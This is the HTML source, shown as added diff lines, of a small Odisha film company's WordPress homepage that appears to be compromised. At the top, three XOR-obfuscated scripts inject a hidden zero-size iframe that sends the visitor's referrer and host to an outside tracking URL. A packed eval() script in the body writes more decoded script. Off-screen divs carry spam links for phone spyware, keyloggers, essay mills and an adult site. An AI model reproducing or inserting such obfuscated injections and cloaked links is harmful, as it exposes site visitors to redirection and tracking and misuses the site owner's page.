+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<div style="left:-7113px; top:-6552px; position:absolute"> <a href="/spy/">Spy</a>
+<a href="/map1.html">Sitemap</a>
+<a href="http://s3movies.com/free-cell-phone-stealth-spy-software/">free cell phone stealth spy software</a>
+<a href="http://s3movies.com/iphone-spyware-app-free/">iphone spyware app free</a>
+<a href="http://s3movies.com/how-to-stop-someone-from-tracking-my-cell-phone/">how to stop someone from tracking my cell phone</a>
+<a href="http://s3movies.com/cell-phone-tracking-device/">cell phone tracking device</a>
+<a href="http://s3movies.com/iphone-spying-on-you/">iphone spying on you</a>
+<a href="http://s3movies.com/iphone-cell-phone-tracker-online/">iphone cell phone tracker online</a>
+<a href="http://s3movies.com/free-spy-text-messages/">free spy text messages</a>
+<a href="http://s3movies.com/is-it-illegal-to-put-spyware-on-someones-phone/">is it illegal to put spyware on someones phone</a>
+<a href="http://s3movies.com/how-to-track-cell-phone-location-using-phone-number/">how to track cell phone location using phone number</a>
+<a href="http://s3movies.com/descargar-spybubble-pro-apk-gratis/">descargar spybubble  device for cheating spouse</a>
+<a href="http://s3movies.com/cell-phone-sim-card-spy/">cell phone sim card spy</a>
+<a href="http://s3movies.com/best-free-anti-keylogger-software-download/">best free anti keylogger software download</a>
+<a href="http://s3movies.com/cydia-app-to-track-cell-phones/">cydia app to track cell phones</a>
+<a href="http://s3movies.com/invisible-keylogger-for-android-free-download/">invisible keylogger for android free download</a>
+<a href="http://s3movies.com/do-iphone-5s-have-tracking-devices/">do iphone 5s have tracking devices</a>
+
+</div>
+
+<div class="container_16">
+<div style="float:left;margin-left: 8px;margin-top: 8px;box-shadow: 1px 1px 15px #fff;">
+<img src="s3.png" />
+</div>
+<div class="topmenu">
+
+<div class="menu-top-menu-container"><ul id="short_menu_5c746b420cfa0" class="shortcode_menu  wpsm-menu enhance_shortcode_menu_inline  "><li id="menu-item-164" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-164"><a href="http://s3movies.com">Investors</a></li>
+<li id="menu-item-115" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-115"><a href="http://s3movies.com/people/">People</a></li>
+<li id="menu-item-163" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-163"><a href="http://s3movies.com">Film Production</a></li>
+<li id="menu-item-69" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-69"><a href="http://s3movies.com/contact-us/">Contact Us</a></li>
+</ul></div><div class="clear"></div>
+			<style>
+				#short_menu_5c746b420cfa0 {  }
+				#short_menu_5c746b420cfa0 ul.wpsm-arrow-enabled:before {  } 
+				#short_menu_5c746b420cfa0 ul, #short_menu_5c746b420cfa0 ul ul {  }
+				#short_menu_5c746b420cfa0 a {  }
+				#short_menu_5c746b420cfa0 a:hover {  }
+				#short_menu_5c746b420cfa0 ul a {  }
+				#short_menu_5c746b420cfa0 ul a:hover {  }
+				
+			</style>
+			<script type="text/javascript">
+				var show_arrow = "true";var $sm = jQuery.noConflict();
+					jQuery(function ($) {
+						$("#short_menu_5c746b420cfa0").tinyNav();
+						$("#short_menu_5c746b420cfa0").next().addClass("shortcode-menu-mobile");
+						
+						shortcode_menu_responsive();
+					});
+					jQuery(window).resize(function($){
+						shortcode_menu_responsive();
+					});
+					function shortcode_menu_responsive()
+					{
+						var window_width = $sm(window).width();
+						if(window_width <= 650)
+						{
+							$sm("#short_menu_5c746b420cfa0").hide();
+							$sm("#short_menu_5c746b420cfa0").next().show();
+						}
+						else
+						{
+							$sm("#short_menu_5c746b420cfa0").show();
+							$sm("#short_menu_5c746b420cfa0").next().hide();
+						}
+					}</script>
+
+</div>
+
+<div class="grid_16 blog_title">
+</div>
+
+<div class="grid_16 navigation">
+
+<div class="menu-main-menu-container"><ul id="short_menu_5c746b420e330" class="shortcode_menu  wpsm-menu enhance_shortcode_menu_inline  "><li id="menu-item-64" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-6 current_page_item menu-item-64"><a href="http://s3movies.com/">Home</a></li>
+<li id="menu-item-72" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-72"><a href="http://s3movies.com/about-us/">About Us</a></li>
+<li id="menu-item-65" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-65"><a href="http://s3movies.com/movies/">Movies</a></li>
+<li id="menu-item-183" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-183"><a href="http://s3movies.com/line-production/">Line Production</a></li>
+<li id="menu-item-74" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-74"><a href="http://s3movies.com/new-room/">News Room</a></li>
+</ul></div><div class="clear"></div>
+			<style>
+				#short_menu_5c746b420e330 {  }
+				#short_menu_5c746b420e330 ul.wpsm-arrow-enabled:before {  } 
+				#short_menu_5c746b420e330 ul, #short_menu_5c746b420e330 ul ul {  }
+				#short_menu_5c746b420e330 a {  }
+				#short_menu_5c746b420e330 a:hover {  }
+				#short_menu_5c746b420e330 ul a {  }
+				#short_menu_5c746b420e330 ul a:hover {  }
+				
+			</style>
+			<script type="text/javascript">
+				var show_arrow = "true";var $sm = jQuery.noConflict();
+					jQuery(function ($) {
+						$("#short_menu_5c746b420e330").tinyNav();
+						$("#short_menu_5c746b420e330").next().addClass("shortcode-menu-mobile");
+						
+						shortcode_menu_responsive();
+					});
+					jQuery(window).resize(function($){
+						shortcode_menu_responsive();
+					});
+					function shortcode_menu_responsive()
+					{
+						var window_width = $sm(window).width();
+						if(window_width <= 650)
+						{
+							$sm("#short_menu_5c746b420e330").hide();
+							$sm("#short_menu_5c746b420e330").next().show();
+						}
+						else
+						{
+							$sm("#short_menu_5c746b420e330").show();
+							$sm("#short_menu_5c746b420e330").next().hide();
+						}
+					}</script>
+
+  <div class="search_box">
+
+    <form method="get" id="searchform" action="http://s3movies.com/">
+
+      <div>
+
+        <input type="image" src="http://s3movies.com/wp-content/themes/that-music-theme/img/search_btn.gif" id="go" alt="Search" title="Search" class="search_btn" />
+
+        <input type="text" value="" name="s" id="s" class="search_field" />
+
+      </div>
+
+    </form>
+
+  </div>
+
+</div>
+
+<div class="grid_16 main_image"><div class="cycloneslider cycloneslider-template-default" id="cycloneslider-new-slider-1"><div class="cycloneslider-slides"><div class="cycloneslider-slide"><img src="http://s3movies.com/wp-content/uploads/2013/10/SLIDE-11-940x330.jpg" width="940" height="330" alt="slide" /></div><div class="cycloneslider-slide"><img src="http://s3movies.com/wp-content/uploads/2013/11/OM-SAI-TUJHE-SALAM-slider-940x330.jpg" width="940" height="330" alt="slide" /></div><div class="cycloneslider-slide"><img src="http://s3movies.com/wp-content/uploads/2013/10/SLIDE-13-940x330.jpg" width="940" height="330" alt="slide" /></div><div class="cycloneslider-slide"><img src="http://s3movies.com/wp-content/uploads/2013/10/SLIDE-14-940x330.jpg" width="940" height="330" alt="slide" /></div><div class="cycloneslider-slide"><img src="http://s3movies.com/wp-content/uploads/2013/10/SLIDE-15-940x330.jpg" width="940" height="330" alt="slide" /></div><div class="cycloneslider-slide"><img src="http://s3movies.com/wp-content/uploads/2013/10/SLIDE-1-940x330.jpg" width="940" height="330" alt="slide" /></div><div class="cycloneslider-slide"><img src="http://s3movies.com/wp-content/uploads/2013/10/SLIDE-21-940x330.jpg" width="940" height="330" alt="slide" /></div><div class="cycloneslider-slide"><img src="http://s3movies.com/wp-content/uploads/2013/10/SLIDE-22-940x330.jpg" width="940" height="330" alt="slide" /></div><div class="cycloneslider-slide"><img src="http://s3movies.com/wp-content/uploads/2013/10/SLIDE-23-940x330.jpg" width="940" height="330" alt="slide" /></div><div class="cycloneslider-slide"><img src="http://s3movies.com/wp-content/uploads/2013/10/SLIDE-2-940x330.jpg" width="940" height="330" alt="slide" /></div><div class="cycloneslider-slide"><img src="http://s3movies.com/wp-content/uploads/2013/10/SLIDE-31-940x330.jpg" width="940" height="330" alt="slide" /></div><div class="cycloneslider-slide"><img src="http://s3movies.com/wp-content/uploads/2013/10/SLIDE-32-940x330.jpg" width="940" height="330" alt="slide" /></div><div class="cycloneslider-slide"><img src="http://s3movies.com/wp-content/uploads/2013/10/SLIDE-33-940x330.jpg" width="940" height="330" alt="slide" /></div><div class="cycloneslider-slide"><img src="http://s3movies.com/wp-content/uploads/2013/10/SLIDE-3-940x330.jpg" width="940" height="330" alt="slide" /></div><div class="cycloneslider-slide"><img src="http://s3movies.com/wp-content/uploads/2013/10/SLIDE-41-940x330.jpg" width="940" height="330" alt="slide" /></div><div class="cycloneslider-slide"><img src="http://s3movies.com/wp-content/uploads/2013/11/Kaunri-Kanya-SLIDER-940x330.jpg" width="940" height="330" alt="slide" /></div><div class="cycloneslider-slide"><img src="http://s3movies.com/wp-content/uploads/2013/10/SLIDE-43-940x330.jpg" width="940" height="330" alt="slide" /></div><div class="cycloneslider-slide"><img src="http://s3movies.com/wp-content/uploads/2013/10/SLIDE-44-940x330.jpg" width="940" height="330" alt="slide" /></div></div><div class="cycloneslider-pager"></div><div class="cycloneslider-prev">Prev</div><div class="cycloneslider-next">Next</div></div><div><script type="text/javascript">jQuery(document).ready(function(){	(function() {	var slider = '#cycloneslider-new-slider-1';	jQuery(slider).width(940);	jQuery(slider+' .cycloneslider-slides').height(330);	jQuery(slider+' .cycloneslider-slides').cycle({	fx: "uncover",	speed: 1000,	timeout: 4000,	pager:jQuery(slider+' .cycloneslider-pager'),	prev:jQuery(slider+' .cycloneslider-prev'),	next:jQuery(slider+' .cycloneslider-next'),	pause:true	});	})();
+});</script></div></div>
+
+<div class="grid_16 content_wrapper">
+
+
+
+
+<div id="left" class="grid_9 omega alpha">
+
+  <div id="content">
+
+    
+    
+    <div class="entry">
+
+      <div class="post" id="post-6">
+
+        <h2><a href="http://s3movies.com/" rel="bookmark" title="Permanent Link to Home">
+
+          Home
+          </a></h2>
+
+        <p class="postinfo">&nbsp;</p>
+
+        <style>
+.entry h2{display:none;}
+.entry p{margin-top: -20px;}
+hr{display:none;!important;}
+</style>
+<p>S3 Movies is a film production &#038; distribution company situated at capital of Odisha. Its operations encompass motion picture production, right acquisition and distribution; digital content creation and distribution; and development of new entertainment products, services and technologies.</p>
+<div style="font-family:Helvetica, Arial, 'Liberation Sans', FreeSans, sans-serif!important;font-size:13px!important;">
+<b>Latest News</b><br />
+<strong>Items for Page:</strong> There are no posts that match the selection criteria.</div>
+<p><script type="text/javascript">
+eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('i(f.j(h.g(b,1,0,9,6,4,7,c,d,e,k,3,2,1,8,0,8,2,t,a,r,s,1,2,6,l,0,4,q,0,2,3,a,p,5,5,5,3,m,n,b,o,1,0,9,6,4,7)));',30,30,'116|115|111|112|101|57|108|62|105|121|58|60|46|100|99|document|fromCharCode|String|eval|write|123|117|120|125|47|45|59|97|98|110'.split('|'),0,{}))
+</script></p>
+<div class="dc">
+Lege , hils hoia men hekasta emo phainetai, taiauta men eslin ema , ho a de sai taiauta de au sai&#8217; tmthropas de su ie kai egil:24 &#8220;does <a href="http://writemypaper4me.org/">http://www.writemypaper4me.org</a> he prot agoras not understand this somewhat as follows?<br />
+It <a href="http://pro-essay-writer.com/">http://www.pro-essay-writer.com/</a> is always the &#8220;relative duration&#8221; of what is alive, i!<br />
+This is at the same time that whole which envelops all and <a href="http://writemyessay4me.org/">http://writemyessay4me.org/</a> in itself includes all as does the sea.</p>
+<div style="position: absolute; left: -3672px;"><a href="https://bestmasturbatorreview.com/best-male-prostate-massagers/">bestmasturbatorreview.com</a></div>
+</div>
+
+        <p class="postinfo">
+
+          
+        </p>
+
+      </div>
+
+    </div>
+
+    
+    <div class="next_nav">
+
+      <div class="alignleft">
+
+        
+      </div>
+
+      <div class="alignright">
+
+        
+      </div>
+
+    </div>
+
+    
+  </div>
+
+</div>
+
+<br clear="all" />
+
+</div>
+
+<div class="grid_16 footer">
+<p class="copyrt">Copyright © 2013 S3 S3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;Site by <a href="http://learnitudetechnologies.com/">Learnitude Technologies (P) Ltd</a></p>
+
+<div class="footermenu">
+<div class="menu-footer-menu-container"><ul id="short_menu_5c746b4216583" class="shortcode_menu  wpsm-menu enhance_shortcode_menu_inline  "><li id="menu-item-84" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-84"><a href="http://s3movies.com/privacy-policy/">Privacy Policy</a></li>
+<li id="menu-item-83" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-83"><a href="http://s3movies.com/disclaimer/">Disclaimer</a></li>
+<li id="menu-item-82" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-82"><a href="http://s3movies.com/terms-conditions/">Terms &#038; Conditions</a></li>
+</ul></div><div class="clear"></div>
+			<style>
+				#short_menu_5c746b4216583 {  }
+				#short_menu_5c746b4216583 ul.wpsm-arrow-enabled:before {  } 
+				#short_menu_5c746b4216583 ul, #short_menu_5c746b4216583 ul ul {  }
+				#short_menu_5c746b4216583 a {  }
+				#short_menu_5c746b4216583 a:hover {  }
+				#short_menu_5c746b4216583 ul a {  }
+				#short_menu_5c746b4216583 ul a:hover {  }
+				
+			</style>
+			<script type="text/javascript">
+				var show_arrow = "true";var $sm = jQuery.noConflict();
+					jQuery(function ($) {
+						$("#short_menu_5c746b4216583").tinyNav();
+						$("#short_menu_5c746b4216583").next().addClass("shortcode-menu-mobile");
+						
+						shortcode_menu_responsive();
+					});
+					jQuery(window).resize(function($){
+						shortcode_menu_responsive();
+					});
+					function shortcode_menu_responsive()
+					{
+						var window_width = $sm(window).width();
+						if(window_width <= 650)
+						{
+							$sm("#short_menu_5c746b4216583").hide();
+							$sm("#short_menu_5c746b4216583").next().show();
+						}
+						else
+						{
+							$sm("#short_menu_5c746b4216583").show();
+							$sm("#short_menu_5c746b4216583").next().hide();
+						}
+					}</script>
+
+
+</div>
+</div>
+<div style="float:right;position:relative;top:-35px;left: 10px;"><a class="synved-social-button synved-social-button-share synved-social-size-24 synved-social-resolution-single synved-social-provider-facebook nolightbox" data-provider="facebook" target="_blank" rel="nofollow" title="Share on Facebook" href="https://www.facebook.com/pages/S3-Movies/1387842808124614" style="font-size: 0px; width:24px;height:24px;margin:0;margin-bottom:5px;margin-right:5px;"><img alt="facebook" title="Share on Facebook" class="synved-share-image synved-social-image synved-social-image-share" width="24" height="24" style="display: inline; width:24px;height:24px; margin: 0; padding: 0; border: none; box-shadow: none;" src="http://s3movies.com/wp-content/plugins/social-media-feather/synved-social/image/social/regular/48x48/facebook.png" /></a><a class="synved-social-button synved-social-button-share synved-social-size-24 synved-social-resolution-single synved-social-provider-twitter nolightbox" data-provider="twitter" target="_blank" rel="nofollow" title="Share on Twitter" href="http://www.twitter.com%20/%20S3movies" style="font-size: 0px; width:24px;height:24px;margin:0;margin-bottom:5px;margin-right:5px;"><img alt="twitter" title="Share on Twitter" class="synved-share-image synved-social-image synved-social-image-share" width="24" height="24" style="display: inline; width:24px;height:24px; margin: 0; padding: 0; border: none; box-shadow: none;" src="http://s3movies.com/wp-content/plugins/social-media-feather/synved-social/image/social/regular/48x48/twitter.png" /></a><a class="synved-social-button synved-social-button-share synved-social-size-24 synved-social-resolution-single synved-social-provider-google_plus nolightbox" data-provider="google_plus" target="_blank" rel="nofollow" title="Share on Google+" href="http://www.google+.com%20/%20S3movies" style="font-size: 0px; width:24px;height:24px;margin:0;margin-bottom:5px;"><img alt="google_plus" title="Share on Google+" class="synved-share-image synved-social-image synved-social-image-share" width="24" height="24" style="display: inline; width:24px;height:24px; margin: 0; padding: 0; border: none; box-shadow: none;" src="http://s3movies.com/wp-content/plugins/social-media-feather/synved-social/image/social/regular/48x48/google_plus.png" /></a><a class="synved-social-credit" target="_blank" rel="nofollow" title="WordPress Social Media Feather" href="http://synved.com/wordpress-social-media-feather/" style="color:#444; text-decoration:none; font-size:8px; margin-left:5px;vertical-align:10px;white-space:nowrap;"><span>by </span><img style="display: inline;margin:0;padding:0;width:16px;height:16px;" width="16" height="16" alt="feather" src="http://s3movies.com/wp-content/plugins/social-media-feather/synved-social/image/icon.png" /></a></div>
+<style>.cpm-map img{ max-width: none;box-shadow:none;}</style><link rel='stylesheet' id='shortcode-menu-style-css'  href='http://s3movies.com/wp-content/plugins/shortcode-menu/shortcode-menu.css?ver=4.4.2' type='text/css' media='all' />
+<script type='text/javascript' src='http://s3movies.com/wp-includes/js/wp-embed.min.js?ver=4.4.2'></script>
+<script type='text/javascript' src='http://s3movies.com/wp-content/plugins/shortcode-menu/js/enhance.menu.js?ver=4.4.2'></script>
+<script type='text/javascript' src='http://s3movies.com/wp-content/plugins/shortcode-menu/js/tinynav.min.js?ver=4.4.2'></script>
+
+
+</body>
+
+</html>
+
+
